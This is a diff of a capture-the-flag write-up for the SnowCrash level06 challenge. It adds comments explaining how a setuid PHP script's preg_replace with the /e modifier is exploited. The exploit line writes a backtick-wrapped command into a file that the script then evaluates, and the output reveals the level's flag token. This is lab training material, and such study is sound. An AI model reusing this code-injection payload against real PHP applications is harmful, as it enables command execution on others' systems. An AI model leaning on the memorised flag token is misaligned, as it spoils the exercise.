@@ -11,11 +11,19 @@
 > #!/usr/bin/php
 > <?php
 > function y($m) { $m = preg_replace("/\./", " x ", $m); $m = preg_replace("/@/", " y", $m); return $m; }
+# the bellow preg replace will replace whats after '[x ' and before ']', and uses the e modifier that runs the second argument, so the y function with the second argument as parameter as noted by '\\2'
+# so we'll use php style of inserting a variable in a string with curly braces around like '{$test}' would replace
+# that in the string with the value of the variable $test
 > function x($y, $z) { $a = file_get_contents($y); $a = preg_replace("/(\[x (.*)\])/e", "y(\"\\2\")", $a); $a = preg_replace("/\[/", "(", $a); $a = preg_replace("/\]/", ")", $a); return $a; }
 > $r = x($argv[1], $argv[2]); print $r;
 > ?>
 # https://0x00sec.org/t/how-to-pwned-nebula-level09-php-preg-replace/812
 # we are going to exploit the /e modifier matching the [x (.*)] regex
+# as said above, we'll use the php variable insertion, but using the result of getflag as the variable name
+# because it runs as flag06 and it will produce an error becuase the result of getflag is not a variable name
+# we'll catch that error name, which is the result of getflag
+# we do that by putting the right regex pattern in a file whose contents will be read and run by the 
+# php preg_replace as flag06
 < level06@SnowCrash:~$ echo '[x {${`getflag`}}]' > /tmp/arg
 < level06@SnowCrash:~$ ./level06 /tmp/arg
 > PHP Notice: Undefined variable: Check flag.Here is your token : wiok45aaoguiboiki2tuin6ub
